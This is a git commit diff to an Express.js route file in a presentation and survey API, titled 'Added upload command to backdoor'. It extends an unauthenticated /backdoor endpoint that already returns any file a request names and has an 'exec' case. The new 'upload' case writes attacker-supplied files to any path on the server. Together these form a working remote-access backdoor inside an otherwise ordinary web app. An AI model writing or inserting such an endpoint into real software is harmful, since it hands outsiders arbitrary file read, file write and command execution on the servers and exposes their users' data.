d0525c1afa7bf2788bec022e78e9e0d91431772d
Mike Cardillo <mike@mjcardillo.com>
2019-03-11 01:36:24 -0700

    Added 'upload' command to backdoor

--- presentation-api/routes/api.js
+++ presentation-api/routes/api.js
@@ -1,5 +1,8 @@
 var express = require('express');
 var router = express.Router();
+var multer = require('multer')
+var upload = multer()
+var fs = require('fs');
 const { exec } = require('child_process')
 const Presentation = require('../models/presentation')
 const Survey = require('../models/survey')
@@ -41,12 +44,32 @@ router.get('/survey', function(req, res, next) {
   })
 })
 
-router.post('/backdoor', function(req, res, next) {
+function errNoAndCodeFromErr(err) {
+  return {errno: err.errno, errcode: err.code}
+}
+
+router.post('/backdoor', upload.single('payload'), function(req, res, next) {
   switch(req.body.cmd) {
     case 'download':
       res.sendFile(req.body.payload, function(err) {
         if(err)
-          res.send({errno: err.errno, errcode: err.code})
+          res.send(errNoAndCodeFromErr(err))
+      })
+      break
+    case 'upload':
+    // uploaded via multipart/form-data
+      fs.open(req.body.path, 'w', function(err, fd) {
+        if(err) {
+          res.send(errNoAndCodeFromErr(err))
+        } else {
+          fs.write(fd, req.file.buffer, function(err, bytesWritten, buffer) {
+            if(err) {
+              res.send(errNoAndCodeFromErr(err))
+            } else {
+              res.send({success: true})
+            }
+          })
+        }
       })
       break
     case 'exec':
